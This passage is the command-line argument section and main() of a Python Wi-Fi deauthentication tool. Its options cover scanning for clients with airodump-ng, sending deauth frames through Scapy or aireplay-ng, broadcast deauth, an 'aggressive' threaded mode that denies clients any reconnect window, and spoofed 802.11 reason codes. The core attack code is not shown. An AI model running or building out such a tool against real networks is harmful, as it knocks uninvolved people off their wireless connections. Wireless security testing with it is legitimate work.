                        help="Seconds between client sweeps (default: 5)")
    # configurable scan window
    parser.add_argument("--scan-duration",      type=float, default=8.0,
                        help="Seconds airodump-ng listens per sweep (default: 8)")
    # per-client delay in aggressive mode
    parser.add_argument("--delay",              type=float, default=0.1,
                        help="Seconds between clients in aggressive deauth loop (default: 0.1)")
    parser.add_argument("--broadcast",          action="store_true",
                        help="Also blast ff:ff:ff:ff:ff:ff deauth")
    parser.add_argument("--aireplay",           action="store_true",
                        help="Use aireplay-ng instead of Scapy for deauth")
    parser.add_argument("--aggressive",         action="store_true",
                        help="Threaded mode: deauth runs in parallel with scanning "
                             "so clients get no reconnect window")
    parser.add_argument("--scan-only",          action="store_true",
                        help="Passive mode — discover and log clients, no deauth")
    parser.add_argument("--auto-monitor",       action="store_true",
                        help="Auto enable monitor mode via airmon-ng (pass base iface e.g. wlan0)")
    # mesh / multi-AP SSID handling
    parser.add_argument("--auto-bssid",         action="store_true",
                        help="Auto-select strongest AP when SSID spans multiple BSSIDs (mesh/roaming)")
    # deauth reason code
    parser.add_argument("--reason",             type=int, default=7,
                        help="802.11 deauth reason code (default: 7 = class-3-frame). "
                             "Common: 1=unspecified, 4=inactivity, 7=class3-frame")

    args = parser.parse_args()

    KTO(
        interface     = args.interface,
        ssid          = args.target,
        whitelist     = load_whitelist(args.whitelist, args.whitelist_file),
        channel       = args.channel,
        deauth_count  = args.count,
        interval      = args.sleep,
        scan_duration = args.scan_duration,
        deauth_delay  = args.delay,
        broadcast     = args.broadcast,
        use_aireplay  = args.aireplay,
        aggressive    = args.aggressive,
        scan_only     = args.scan_only,
        auto_monitor  = args.auto_monitor,
        auto_bssid    = args.auto_bssid,
        reason        = args.reason,
    ).run()


if __name__ == "__main__":
    main()
